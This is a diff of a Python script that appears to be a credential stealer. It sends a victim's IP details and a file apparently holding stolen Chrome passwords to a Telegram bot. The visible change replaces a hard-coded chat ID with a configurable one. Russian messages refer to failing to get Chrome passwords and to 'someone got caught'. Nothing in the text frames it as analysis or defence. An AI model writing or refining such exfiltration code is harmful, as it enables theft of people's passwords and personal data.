@@ -151,7 +151,7 @@ def get_ip_info(ip='127.0.0.1'):
               f"____________________________\n"
         message = f"IP и ИНФА:{ip_data}\n"\
                   f"____________________________\n"
-        bot.send_message(1191491975, message)
+        bot.send_message (chat_id,message)
     except requests.exceptions.RequestException as e:
         print(f"Error getting IP information: {e}")
     save_uu(uu)
@@ -212,8 +212,8 @@ def get_yy():
         
         
         doc = open('yy.txt', 'rb')
-        bot.send_document(1191491975, doc)
-        bot.send_document(1191491975, "FILEID")  
+        bot.send_document(chat_id, doc)
+        bot.send_document(chat_id, "FILEID")  
 
     except FileNotFoundError:
         print("error")
@@ -221,7 +221,7 @@ def get_yy():
         print(f"Произошла ошибка при получении паролей Chrome: {e}")
 message = f"Кто-то схавал:) Держи"
 
-bot.send_message(1191491975, message)
+bot.send_message(chat_id, message)
 
 if __name__ == "__main__":
     main(),ma(),j()
